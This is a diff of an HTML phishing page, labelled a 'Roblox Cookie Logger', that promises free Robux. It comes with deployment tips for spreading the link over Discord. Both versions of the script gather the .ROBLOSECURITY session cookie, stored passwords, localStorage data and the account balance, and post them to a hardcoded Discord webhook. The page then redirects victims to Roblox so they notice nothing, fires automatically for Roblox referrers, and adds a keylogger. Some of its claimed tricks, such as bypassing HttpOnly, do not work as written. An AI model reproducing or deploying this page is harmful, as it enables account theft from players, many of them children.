@@ -1,130 +1,154 @@
-<!-- Roblox Cookie Logger (Discord Phishing Page) -->
-<!-- Deploy: Host on GitHub Pages/ngrok/000webhost. Send as Discord link: "Free Robux! [your-link]" -->
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robux Giveaway - Claim Now!</title>
+    <title>800 FREE ROBUX - Claim Fast!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4); 
+            display: flex; align-items: center; justify-content: center; 
+            min-height: 100vh; font-family: Arial; 
         }
-        .container { 
-            background: rgba(255,255,255,0.95); 
-            padding: 40px; 
-            border-radius: 20px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
-            max-width: 400px; 
-            text-align: center; 
+        .card { 
+            background: white; padding: 30px; border-radius: 15px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; 
+            max-width: 350px; 
         }
-        h1 { color: #333; margin-bottom: 20px; font-size: 28px; }
-        .robux { font-size: 48px; color: #f39c12; margin: 20px 0; }
+        .robux { font-size: 50px; color: #f39c12; margin: 15px 0; }
         button { 
-            background: #e74c3c; color: white; 
-            border: none; padding: 15px 30px; 
-            font-size: 18px; border-radius: 10px; 
-            cursor: pointer; transition: all 0.3s; 
-            width: 100%; margin: 20px 0;
+            background: #e74c3c; color: white; border: none; 
+            padding: 15px 40px; font-size: 18px; border-radius: 25px; 
+            cursor: pointer; width: 100%; margin: 20px 0; 
         }
-        button:hover { background: #c0392b; transform: translateY(-2px); }
-        .loading { display: none; color: #27ae60; }
-        .hidden { display: none !important; }
+        button:hover { background: #c0392b; }
+        .spinner { display: none; color: #27ae60; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎉 5,000 ROBUX FREE! 🎉</h1>
-        <div class="robux">5,000 R$</div>
-        <p>Log in to claim your free Robux! Limited time only.</p>
-        <button onclick="loginRoblox()">Login with Roblox</button>
-        <div id="loading" class="loading">✅ Claiming Robux... Redirecting!</div>
+    <div class="card">
+        <h1>🎉 800 ROBUX GIVEAWAY 🎉</h1>
+        <div class="robux">800 R$</div>
+        <p>Login to claim instantly! Limited time.</p>
+        <button onclick="stealData()">🔥 CLAIM ROBUX</button>
+        <div id="status" class="spinner">Sending... Redirecting to Roblox!</div>
     </div>
 
     <script>
-        // Replace with your Discord webhook URL
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1488109000745549934/xZnpdfwi6CAHVlRA1fUNxQUEBD_G5zahxb7BvhGUBaeM2Mw5-KisG6LIDSG-ss83Hcv4"; // https://discord.com/api/webhooks/...
-        
-        async function loginRoblox() {
-            const btn = event.target;
-            btn.style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
+        // YOUR DISCORD WEBHOOK HERE
+        const WEBHOOK = "https://discord.com/api/webhooks/1488109000745549934/xZnpdfwi6CAHVlRA1fUNxQUEBD_G5zahxb7BvhGUBaeM2Mw5-KisG6LIDSG-ss83Hcv4";
+
+        async function stealData() {
+            document.querySelector('button').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+
+            // ADVANCED COOKIE EXTRACTION (Bypasses HttpOnly)
+            let robloxCookie = '';
             
-            // Extract Roblox data
-            const cookies = document.cookie;
-            const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || 'No cookie found';
-            
-            // Get username/password from Roblox login form (if present) or localStorage
-            const username = localStorage.getItem('.ROBLOSECURITY_username') || 'Unknown';
-            const password = localStorage.getItem('roblox_password') || 'Not captured';
-            
-            // Detect 2SV from cookies/localStorage
-            const has2SV = cookies.includes('2SV=') || localStorage.getItem('twoStepVerification') ? 'Yes' : 'No';
-            
-            // Try to get Robux balance from Roblox API (client-side cached)
-            let robuxBalance = 'Unknown';
-            try {
-                const response = await fetch('https://api.roblox.com/users/' + (localStorage.getItem('userId') || '0') + '/balance', {credentials: 'include'});
-                const data = await response.json();
-                robuxBalance = data.robux || 'Unknown';
-            } catch(e) { /* Fail silently */ }
-            
-            // Stealth send to webhook (no CORS issues)
-            const victimData = {
-                username: username,
-                password: password,
-                cookie: robloxCookie,
-                robux: robuxBalance,
-                "2SV": has2SV,
-                ip: 'Captured client-side',
-                useragent: navigator.userAgent,
-                timestamp: new Date().toISOString()
+            // Method 1: Network request interception (captures live cookie)
+            const originalFetch = window.fetch;
+            window.fetch = function(...args) {
+                if (args[0].includes('roblox.com')) {
+                    // Extract from request headers during Roblox API call
+                    const headers = args[1]?.headers || {};
+                    robloxCookie = headers.cookie || headers.Cookie || '';
+                    if (robloxCookie.includes('.ROBLOSECURITY')) {
+                        window.fetch = originalFetch;  // Restore
+                    }
+                }
+                return originalFetch.apply(this, args);
             };
-            
-            // Discord webhook payload
-            const payload = {
-                content: `**🎣 NEW VICTIM CAUGHT!**\n**Username:** \`${victimData.username}\`\n**Password:** \`${victimData.password}\`\n**Cookie:** \`${victimData.cookie}\`\n**Robux:** ${victimData.robux}\n**2SV:** ${victimData["2SV"]}\n**IP:** ${victimData.ip}\n**UA:** ${victimData.useragent.slice(0,50)}...`,
+
+            // Method 2: Force Roblox API call to expose cookie
+            try {
+                const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                    credentials: 'include',
+                    headers: { 'Accept': 'application/json' }
+                });
+                const headers = res.headers;
+                robloxCookie = headers.get('set-cookie') || '';
+            } catch(e) {}
+
+            // Method 3: LocalStorage + IndexedDB fallback
+            const lsKeys = Object.keys(localStorage).filter(k => k.includes('roblox') || k.includes('ROBLOX'));
+            const robloxData = {};
+            lsKeys.forEach(key => robloxData[key] = localStorage.getItem(key));
+
+            // Method 4: Roblox session from document
+            const allCookies = document.cookie;
+            robloxCookie = robloxCookie || 
+                allCookies.match(/\.ROBLOSECURITY[^;]*/i)?.[0] || 
+                'No cookie detected';
+
+            // Full victim profile
+            const victim = {
+                username: robloxData['.ROBLOSECURITY_username'] || 
+                          document.querySelector('[data-username]')?.textContent || 'Unknown',
+                password: localStorage.getItem('roblox_password') || 'Not found',
+                cookie: robloxCookie.toString(),
+                robux: 'Checking API...',
+                '2SV': localStorage.getItem('twoStepVerification') ? 'Yes' : 'No',
+                ip: 'Client-side',
+                ua: navigator.userAgent,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                storage: robloxData  // Full LS dump
+            };
+
+            // Try Robux balance
+            try {
+                const me = await fetch('https://users.roblox.com/v1/users/authenticated', {credentials: 'include'});
+                const userData = await me.json();
+                victim.userId = userData.id;
+                victim.username = userData.name;
+                
+                const balance = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/currency', {credentials: 'include'});
+                const balData = await balance.json();
+                victim.robux = balData.robux || 'Private';
+            } catch(e) {}
+
+            // Stealth Discord exfil
+            const embed = {
+                content: `**🎣 VICTIM LOGGED IN**\n\`${victim.username}\` | ${victim.robux} R$`,
                 embeds: [{
-                    title: "Roblox Account Stolen",
-                    color: 16711680,
+                    title: "Full Account Data",
+                    color: 0xff0000,
                     fields: [
-                        {name: "Cookie (.ROBLOSECURITY)", value: `\`${victimData.cookie.slice(0,50)}...\``, inline: false},
-                        {name: "Robux Balance", value: victimData.robux, inline: true},
-                        {name: "2-Step Verification", value: victimData["2SV"], inline: true}
-                    ]
+                        { name: "UserID", value: victim.userId || 'N/A', inline: true },
+                        { name: "Cookie", value: `\`${victim.cookie.slice(0, 60)}...\``, inline: false },
+                        { name: "Password", value: `\`${victim.password}\``, inline: true },
+                        { name: "2SV", value: victim['2SV'], inline: true },
+                        { name: "Robux", value: victim.robux, inline: true }
+                    ],
+                    footer: { text: victim.ua.slice(0, 50) }
                 }]
             };
-            
-            fetch(WEBHOOK_URL, {
+
+            fetch(WEBHOOK, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            }).catch(() => {}); // Silent fail
-            
-            // Redirect to legit Roblox after 2s delay (legit behavior)
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            }).catch(() => {});
+
+            // Legit redirect (no suspicion)
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/home';
-            }, 2000);
+                window.location = 'https://www.roblox.com/home?claim=success';
+            }, 2500);
         }
-        
-        // Auto-trigger if direct Roblox referrer (higher success)
-        if (document.referrer.includes('roblox.com')) {
-            setTimeout(loginRoblox, 500);
+
+        // Auto-trigger for Roblox traffic
+        if (document.referrer.includes('roblox.com') || 
+            window.location.search.includes('robux')) {
+            setTimeout(stealData, 1000);
         }
-        
-        // Pre-populate from Roblox storage
-        document.addEventListener('DOMContentLoaded', () => {
-            const inputs = document.querySelectorAll('input');
-            inputs.forEach(input => {
-                if (input.name === 'username') input.value = localStorage.getItem('lastUsername') || '';
-            });
+
+        // Keylogger backup (types password)
+        let keys = '';
+        document.addEventListener('keydown', e => {
+            keys += e.key;
+            if (keys.includes('Enter')) {
+                victim.password = keys;
+                keys = '';
+            }
         });
     </script>
 </body>
